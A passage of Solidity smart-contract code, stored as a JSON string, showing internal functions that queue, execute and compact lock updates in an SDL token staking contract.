lock.amount, lock.boostAmount, lock.duration);\n            emit Transfer(address(0), _owner, lockId);\n\n            ++i;\n        }\n\n        for (uint256 j = 0; j < numNewLocks; ++j) {\n            if (i == numNewLocks) {\n                newLocksByOwner[_owner].pop();\n            } else {\n                newLocksByOwner[_owner][j] = newLocksByOwner[_owner][i];\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @notice queued an update for a lock\n     * @param _owner owner of lock\n     * @param _lockId id of lock\n     * @param _amount new amount of underlying SDL\n     * @param _lockingDuration new locking duration\n     **/\n    function _queueLockUpdate(\n        address _owner,\n        uint256 _lockId,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal onlyLockOwner(_lockId, _owner) {\n        Lock memory lock = _getQueuedLockState(_lockId);\n        LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));\n        queuedLockUpdates[_lockId].push(lockUpdate);\n        queuedRESDLSupplyChange +=\n            int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -\n            int256(lock.amount + lock.boostAmount);\n        if (updateNeeded == 0) updateNeeded = 1;\n\n        emit QueueUpdateLock(_owner, _lockId, lockUpdate.lock.amount, lockUpdate.lock.boostAmount, lockUpdate.lock.duration);\n    }\n\n    /**\n     * @notice executes a series of lock updates\n     * @dev will only update locks that are part of finalized batches\n     * @param _owner owner of locks\n     * @param _lockIds list of ids for locks to update\n     **/\n    function _executeQueuedLockUpdates(address _owner, uint256[] memory _lockIds) internal updateRewards(_owner) {\n        uint256 finalizedBatchIndex = _getFinalizedUpdateBatchIndex();\n\n        for (uint256 i = 0; i < _lockIds.length; ++i) {\n            uint256 lockId = _lockIds[i];\n            _onlyLockOwner(lockId, _owner);\n            uint256 numUpdates = queuedLockUpdates[lockId].length;\n\n            Lock memory curLockState = locks[lockId];\n            uint256 j = 0;\n            while (j < numUpdates) {\n                if (queuedLockUpdates[lockId][j].updateBatchIndex > finalizedBatchIndex) break;\n\n                Lock memory updateLockState = queuedLockUpdates[lockId][j].lock;\n                int256 baseAmountDiff = int256(updateLockState.amount) - int256(curLockState.amount);\n                int256 boostAmountDiff = int256(updateLockState.boostAmount) - int256(curLockState.boostAmount);\n\n                if (baseAmountDiff < 0) {\n                    emit Withdraw(_owner, lockId, uint256(-1 * baseAmountDiff));\n                    if (updateLockState.amount == 0) {\n                        delete locks[lockId];\n                        delete lockOwners[lockId];\n                        balances[_owner] -= 1;\n                        if (tokenApprovals[lockId] != address(0)) delete tokenApprovals[lockId];\n                        emit Transfer(_owner, address(0), lockId);\n                    } else {\n                        locks[lockId].amount = updateLockState.amount;\n                    }\n                    sdlToken.safeTransfer(_owner, uint256(-1 * baseAmountDiff));\n                } else if (boostAmountDiff < 0) {\n                    locks[lockId].expiry = updateLockState.expiry;\n                    locks[lockId].boostAmount = 0;\n                    emit InitiateUnlock(_owner, lockId, updateLockState.expiry);\n                } else {\n                    locks[lockId] = updateLockState;\n                    uint256 totalDiff = uint256(baseAmountDiff + boostAmountDiff);\n                    effectiveBalances[_owner] += totalDiff;\n                    totalEffectiveBalance += totalDiff;\n                    emit UpdateLock(\n                        _owner,\n                        lockId,\n                        updateLockState.amount,\n                        updateLockState.boostAmount,\n                        updateLockState.duration\n                    );\n                }\n                curLockState = updateLockState;\n                ++j;\n            }\n\n            for (uint256 k = 0; k < numUpdates; ++k) {\n                if (j == numUpdates) {\n                    queuedLockUpdates[lockId].pop();\n                } else {\n                    queuedLockUpdates[lockId][k] = queuedLockUpdates[lockId][j];\n                    ++j;\n                }\n            }\n        }\n    }\n\n    /**\n     * @notice returns the current state of a lock\n     * @dev will return the most recent queued update for a lock or the finalized state if there are no queued updates\n     * @param _lockId id of lock\n     * @return the current state of a lock\n     **/\n    function _getQueuedLockState(uint256 _lockId) internal view returns (Lock memory) {\n        uint256 updatesLength = queuedLockUpdates[_lockId].length;\n\n        if (updatesLength != 0)"
    }
  ]
}